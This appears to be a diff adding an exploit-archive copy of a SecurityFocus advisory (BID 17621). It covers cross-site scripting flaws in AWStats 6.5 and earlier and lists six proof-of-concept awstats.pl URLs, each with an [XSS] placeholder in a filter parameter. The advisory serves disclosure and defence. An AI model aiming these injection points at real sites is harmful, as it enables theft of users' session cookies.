@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/17621/info
+
+AWStats is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+AWStats version 6.5 (build 1.857) and prior are vulnerable to these issues.
+
+http://www.example.com/awstats.pl?refererpagesfilter=[XSS]&refererpagesfilterex=&output=refererpages&config=unsecured-systems.com&year=2006&month=all
+http://www.example.com/awstats.pl?refererpagesfilter=&refererpagesfilterex=[XSS]&output=refererpages&config=unsecured-systems.com&year=2006&month=all
+http://www.example.com/awstats.pl?urlfilter=&urlfilterex=[XSS]&output=urlentry&config=unsecured-systems.com&year=2006&month=all
+http://www.example.com/awstats.pl?urlfilter=[XSS]&urlfilterex=&output=urlentry&config=unsecured-systems.com&year=2006&month=all
+http://www.example.com/awstats.pl?hostfilter=[XSS]&hostfilterex=&output=allhosts&config=unsecured-systems.com&year=2006&month=all
+http://www.example.com/awstats.pl?hostfilter=&hostfilterex=[XSS]&output=allhosts&config=unsecured-systems.com&year=2006&month=all
